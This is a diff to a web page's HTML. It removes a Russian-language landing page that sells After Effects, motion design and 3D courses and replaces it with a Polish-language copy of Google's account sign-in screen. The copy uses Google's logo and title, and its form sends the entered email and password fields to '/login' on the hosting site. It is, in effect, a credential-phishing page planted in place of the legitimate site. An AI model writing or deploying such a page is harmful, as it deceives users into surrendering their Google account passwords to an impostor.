@@ -1,84 +1,33 @@
-<!doctype html>
-<html lang="ru">
+<!DOCTYPE html>
+<html lang="pl">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>WHYDESCR1M — курсы по After Effects, моушену и 3D</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@400;600&family=Manrope:wght@400;500;600;700&family=Pixelify+Sans:wght@500;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <title>Zaloguj się – Konta Google</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: white; padding: 48px; border: 1px solid #ddd; border-radius: 8px; width: 360px; text-align: center; }
+        .logo { width: 75px; height: 24px; margin-bottom: 16px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px 0; }
+        p { font-size: 16px; color: #5f6368; margin-bottom: 24px; }
+        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; margin-bottom: 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px #d2e3fc; }
+        .button-container { display: flex; justify-content: flex-end; margin-top: 24px; }
+        button { background-color: #1a73e8; color: white; border: none; border-radius: 4px; padding: 8px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        button:hover { background-color: #185abc; }
+    </style>
 </head>
 <body>
-<div class="blob b1"></div><div class="blob b2"></div><div class="blob b3"></div><div class="grain"></div><div id="glow"></div>
-
-<header>
-<nav class="glass">
-<b>WHYDESCR1M</b>
-<div class="tabs" role="tablist"><button role="tab" data-v="courses" aria-selected="true" data-i18n="tab_courses">Курсы</button><button role="tab" data-v="portfolio" aria-selected="false" data-i18n="tab_portfolio">Портфолио</button></div>
-<div class="ctl">
-<div class="lc" id="lc" role="group" aria-label="Language and currency" data-lang="ru"><span class="lc-i"></span><button data-l="ru" aria-pressed="true">RU · ₽</button><button data-l="en" aria-pressed="false">EN · $</button></div>
-</div>
-</nav>
-</header>
-
-<main class="wrap">
-<!-- ===== КУРСЫ / COURSES ===== -->
-<div class="view on" id="v-courses">
-<div class="hero">
-<div>
-<h1 data-i18n="hero_h1"></h1>
-<p data-i18n="hero_p"></p>
-<div class="row"><a class="btn" href="#courses-list" data-mag data-i18n="cta_pick"></a><a class="btn ghost" href="https://t.me/WHYDESCR1M" target="_blank" rel="noopener" data-mag data-i18n="cta_tg"></a></div>
-</div>
-<div class="glass tl" aria-hidden="true">
-<div class="tl-top"><span class="rec"><i></i><span data-i18n="rec"></span></span><span id="tc">00:00:00</span></div>
-<div class="tracks" id="tracks"><div id="ph"></div></div>
-</div>
-</div>
-
-<section id="courses-list">
-<div class="head"><h2 data-i18n="h_courses"></h2><p data-i18n="p_courses"></p></div>
-<div class="courses" id="courses"></div>
-</section>
-
-<section id="build">
-<div class="head"><h2 data-i18n="h_build"></h2><p data-i18n="p_build"></p></div>
-<div class="build">
-<div class="glass bp" id="opts"></div>
-<div class="glass sum">
-<div class="lbl" style="color:var(--muted);font-size:14px" data-i18n="topay"></div>
-<div class="total" id="total" data-v="0">0</div>
-<div id="lines"></div>
-<div class="save" id="save"></div>
-<a class="btn buy" id="enroll" href="https://t.me/WHYDESCR1M" target="_blank" rel="noopener" data-mag><span class="t t1"><span data-i18n="enroll"></span></span><span class="t t2"><span data-i18n="opening"></span></span></a>
-</div>
-</div>
-</section>
-
-<section>
-<div class="glass contact">
-<h2 data-i18n="h_q"></h2>
-<p data-i18n="p_q"></p>
-<a class="btn" href="https://t.me/WHYDESCR1M" target="_blank" rel="noopener" data-mag>@WHYDESCR1M</a>
-</div>
-</section>
-</div>
-
-<!-- ===== ПОРТФОЛИО / PORTFOLIO ===== -->
-<div class="view" id="v-portfolio">
-<section style="padding-top:60px">
-<div class="head"><h2 data-i18n="h_port"></h2><p data-i18n="p_port"></p></div>
-<div class="filters" id="filters" role="group"></div>
-<div class="grid" id="grid"></div>
-</section>
-<section style="padding-top:0"><div class="glass contact"><h2 data-i18n="h_want"></h2><p data-i18n="p_want"></p><button class="btn" data-go="courses" data-mag data-i18n="cta_courses"></button></div></section>
-</div>
-</main>
-<footer><div class="scene" id="scene" aria-hidden="true"></div></footer>
-
-<div class="modal" id="modal"><div class="glass mbox"><div class="thumb" id="mthumb"><div class="play"><i>▶</i></div></div><div class="mi"><h3 id="mt"></h3><p id="md"></p><div class="row"><a class="btn" id="mlink" href="https://t.me/WHYDESCR1M" target="_blank" rel="noopener"></a><button class="btn ghost" id="mclose" data-i18n="close"></button></div></div></div></div>
-<div class="toast glass" id="toast" role="status"></div>
-<script src="script.js"></script>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" class="logo">
+        <h1>Zaloguj się</h1>
+        <p>Użyj swojego konta Google</p>
+        <form action="/login" method="post">
+            <input type="email" name="Email" placeholder="E-mail lub telefon" required>
+            <input type="password" name="Passwd" placeholder="Wpisz hasło" required>
+            <div class="button-container">
+                <button type="submit">Dalej</button>
+            </div>
+        </form>
+    </div>
 </body>
 </html>
